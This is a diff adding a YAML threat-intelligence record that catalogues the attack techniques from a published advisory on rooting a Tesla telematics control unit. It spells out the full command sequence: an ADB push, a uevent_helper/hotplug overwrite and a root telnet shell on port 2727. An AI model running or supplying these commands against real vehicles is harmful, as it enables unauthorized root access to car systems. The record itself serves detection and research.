@@ -1,0 +1,65 @@
+description: Tesla TCU root access via ADB bypass and uevent_helper exploitation.
+attribution: Tesla
+TTPs:
+  processes:
+  - /sbin/adbd
+  commandline:
+  - adb push telnetd.sh /tmp/telnetd.sh
+  - echo '/tmp/telnetd.sh' > t2.sh
+  - adb push t2.sh /sys/kernel/uevent_helper
+  - adb push t2.sh /proc/sys/kernel/hotplug
+  - adb pull /etc/passwd
+  - adb forward tcp:2727 tcp:2727
+  - sleep 3
+  - telnet 127.0.0.1 2727
+  powershell: []
+  scripting_engine:
+  - "#!/bin/sh\n touch /tmp/executed\n telnetd -l /bin/bash -p 2727"
+  - '# Upload telnet script to TCU
+
+    chmod +x telnetd.sh
+
+    adb push telnetd.sh /tmp/telnetd.sh
+
+    # Write "/tmp/telnetd.sh" to uevent_helper and hotplug
+
+    echo ''/tmp/telnetd.sh'' > t2.sh
+
+    adb push t2.sh /sys/kernel/uevent_helper
+
+    adb push t2.sh /proc/sys/kernel/hotplug
+
+    # Trigger a uevent just by doing a file system read
+
+    adb pull /etc/passwd
+
+    # Setup the TCP port forward for port 2727
+
+    adb forward tcp:2727 tcp:2727
+
+    # Wait for telnetd to run
+
+    sleep 3
+
+    # Connect to the telnet shell
+
+    telnet 127.0.0.1 2727'
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: adb
+    destination: 127.0.0.1
+    port: 2727
+  file_activity:
+  - /tmp/telnetd.sh
+  - t2.sh
+  - /etc/passwd
+  persistence:
+  - Write '/tmp/telnetd.sh' to /sys/kernel/uevent_helper or /proc/sys/kernel/hotplug
+  process_relations: []
+authors:
+- Alex Plaskett
+- McCaulay Hudson
+reference: https://www.nccgroup.com/research-blog/technical-advisory-tesla-telematics-control-unit-adb-auth-bypass/
+date_of_publication: September 29, 2025
+file_creation_date: October 01, 2025
